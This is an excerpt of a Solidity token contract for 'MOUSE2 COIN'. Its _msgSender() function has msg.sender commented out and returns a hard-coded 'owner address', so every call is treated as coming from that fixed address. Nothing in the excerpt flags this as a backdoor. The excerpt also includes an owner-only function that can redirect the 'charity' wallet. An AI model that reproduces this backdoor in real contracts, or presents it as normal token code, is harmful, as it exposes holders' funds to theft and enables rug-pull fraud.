...
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        //return msg.sender;
         return 0xa29DD943739674cB017ae1d5D07fD36edc836210; // owner address 
    }
...
contract MOUSE2 is Context, IERC20, Ownable {
    ...
    address private _charityWalletAddress = 0xf830f481E644276ECaB32C793a9B3f37603d8755; // Project Address
    ...
    string private _name = "MOUSE2 COIN";
    string private _symbol = "MOUSE2";
  ...
  function ChangeCharityAddress(address chartadd) public onlyOwner {
      _charityWalletAddress = chartadd; 
  }
